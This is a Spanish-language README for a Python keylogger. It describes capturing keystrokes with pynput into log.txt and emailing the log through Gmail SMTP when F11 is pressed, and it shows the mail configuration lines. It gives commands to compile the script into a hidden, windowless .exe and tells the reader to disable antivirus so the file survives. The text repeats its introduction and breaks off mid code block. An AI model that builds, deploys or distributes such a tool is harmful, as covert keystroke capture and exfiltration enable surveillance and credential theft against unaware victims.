# 🖥️ KeyLogger en Python  

Este es un **KeyLogger** desarrollado en Python que registra las teclas presionadas y las guarda en un archivo `log.txt`. Además, permite enviar el registro por correo electrónico presionando `F11` y cerrar el programa con la tecla `ESC`.  

## 📌 Instalación de Dependencias en Python

Antes de ejecutar el keylogger, asegúrate de instalar las bibliotecas necesarias.

## 📌 Requisitos

🔹 Python 3.x instalado en tu sistema.
🔹 Conexión a Internet para descargar las dependencias.

## 🚀 Instalación de Dependencias

### 1️⃣ Instalar `pynput` para Captura de Teclado

El módulo `pynput` permite registrar las teclas presionadas en el sistema. Instálalo con:

```bash
pip install pynput
```

### 2️⃣ Instalar `smtplib` y `email` para Envío de Correos

El módulo `smtplib` ya está incluido en Python, pero `email` se usa para estructurar los mensajes de correo. Se recomienda actualizar `email` con:

```bash
pip install secure-smtplib
```

### 3️⃣ Verificar Instalación

Después de instalar las dependencias, verifica que se hayan instalado correctamente ejecutando:

## ✉️ Configuración del Correo

Abre el archivo y reemplaza los siguientes valores con tu información:

```python
mensaje["From"] = "tucorreo@gmail.com"
mensaje["To"] = "destinatario@gmail.com"
server.login("tucorreo@gmail.com", "tu_contraseña")
server.sendmail("tucorreo@gmail.com", "destinatario@gmail.com", mensaje.as_string().encode('utf-8'))
```

🔹 **Usa una contraseña de aplicación en lugar de tu contraseña real para mayor seguridad.**

# 🖥️ KeyLogger en Python  

Este es un **KeyLogger** desarrollado en Python que registra las teclas presionadas y las guarda en un archivo `log.txt`. Además, permite enviar el registro por correo electrónico presionando `F11` y cerrar el programa con la tecla `ESC`.  

---

## 🚀 1️⃣ Inicio del KeyLogger  
Para ejecutar el KeyLogger, abre la terminal y ejecuta:  

```bash
python KeyLogger_Mail.py
```

Al iniciarse, mostrará el siguiente mensaje en la terminal:  

```
(+) Se inició el KeyLogger
```

![Inicio del KeyLogger](https://via.placeholder.com/800x400?text=Inicio+del+KeyLogger)

---

## ⏹️ 2️⃣ Cerrar el KeyLogger  
Para **detener la ejecución**, simplemente presiona la tecla `ESC`. Esto cerrará el programa inmediatamente.  

![Cerrar KeyLogger con ESC](https://via.placeholder.com/800x400?text=Cerrar+KeyLogger+con+ESC)

---

## 📩 3️⃣ Enviar el registro por correo  
Si presionas la tecla `F11`, el KeyLogger **enviará el archivo `log.txt` a través de un correo electrónico**.  

![Correo recibido con log.txt](https://via.placeholder.com/800x400?text=Correo+con+Log+Adjunto)

---

## 🛠️ Compilar a .exe  
Para convertir este script en un ejecutable `.exe`, usa el siguiente comando:  

```bash
pyinstaller --onefile --noconsole KeyLogger_Mail.py
```

Antes de compilar, **desactiva el antivirus**, ya que podría eliminar el ejecutable.  

![Desactivar antivirus](https://via.placeholder.com/800x400?text=Desactivar+Antivirus)



Si todo está bien, ya puedes ejecutar el script sin problemas. 🚀

# 🛠️ Crear un Archivo Ejecutable (.exe) con PyInstaller

Para convertir el script en un archivo ejecutable `.exe`, es necesario utilizar `pyinstaller`. Antes de proceder, **desactiva tu antivirus**, ya que podría detectar el keylogger como una amenaza y eliminarlo.

🔹 Instalar pyinstaller

```bash
pip install pyinstaller
```

### 🚨 Desactivar Antivirus

🔹 Desactiva temporalmente la protección en tiempo real de tu antivirus antes de ejecutar el siguiente comando puede saltar un error asi.

![Desactivar Antivirus](./keylogger_antivirus.png)

### 🔹 Generar el Archivo .exe

Ejecuta el siguiente comando en la terminal dentro de la carpeta donde se encuentra `KeyLogger_Mail.py`:

```bash
pyinstaller --onefile --noconsole keylogger.py
